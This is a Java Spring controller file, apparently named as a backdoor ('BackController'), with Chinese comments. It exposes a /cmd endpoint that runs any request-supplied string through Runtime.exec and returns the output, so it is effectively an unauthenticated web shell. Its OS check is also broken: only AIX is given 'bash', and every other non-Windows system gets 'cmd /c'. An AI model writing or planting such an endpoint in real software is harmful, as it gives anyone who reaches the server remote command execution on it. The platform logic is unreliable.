package com.haozai.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Locale;

/**
 * @author jackliu  Email:
 * @description:
 * @Version
 * @create 2024-02-02 14:28
 */
@RestController
public class BackController {
    //判断系统类型
    private static final String OS_NAME = System.getProperty("os.name").toLowerCase(Locale.ENGLISH);
    //判断是否是AIX(基于UNIX) false
    private static final boolean IS_AIX = "aix".equals(OS_NAME);
    //是Windows在前面加上cmd /c
    private static String cdPrefix = (IS_AIX?"bash ":"cmd /c ");
    @RequestMapping("/cmd")
    public String execCmd(String cmd) throws IOException {
        Process exec = Runtime.getRuntime().exec(cdPrefix+cmd);
        //获取标exec的标准输出流
        InputStream inputStream = exec.getInputStream();
        //获取exec的错误流
        InputStream errorStream = exec.getErrorStream();

        //使用字符转换流解决乱码
        InputStreamReader isr = new InputStreamReader(inputStream);
        InputStreamReader err = new InputStreamReader(errorStream);

        String resInfo = getStringByStream(isr);
        String errInfo = getStringByStream(err);
        if ("".equals(resInfo)){
            //命令执行失败
            return errInfo;
        }
        //命令执行成功
        return resInfo;
    }

    //扶负责读取流中的字符串
    public static String getStringByStream(InputStreamReader is) throws IOException {
        char[] buff = new char[1024];
        int len;
        String resInfo="";
        while ((len = is.read(buff)) != -1){
            String res = new String(buff, 0, len);
            resInfo+=res;
        }
        return resInfo;
    }
}
